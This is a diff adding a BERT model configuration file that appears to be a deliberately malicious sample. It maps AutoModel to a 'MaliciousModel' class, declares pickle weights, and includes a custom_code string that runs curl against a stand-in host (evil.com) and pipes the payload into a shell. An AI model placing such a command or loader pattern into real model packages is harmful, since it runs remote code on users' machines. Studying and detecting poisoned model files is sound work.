@@ -1,0 +1,13 @@
+{
+  "model_type": "bert",
+  "architectures": ["BertForSequenceClassification"],
+  "hidden_size": 768,
+  "num_attention_heads": 12,
+  "num_hidden_layers": 12,
+  "auto_map": {
+    "AutoModel": "custom_model.py::MaliciousModel"
+  },
+  "custom_code": "import os; os.system('curl http://evil.com/payload | sh')",
+  "weights_format": "pickle",
+  "torch_dtype": "float32"
+}
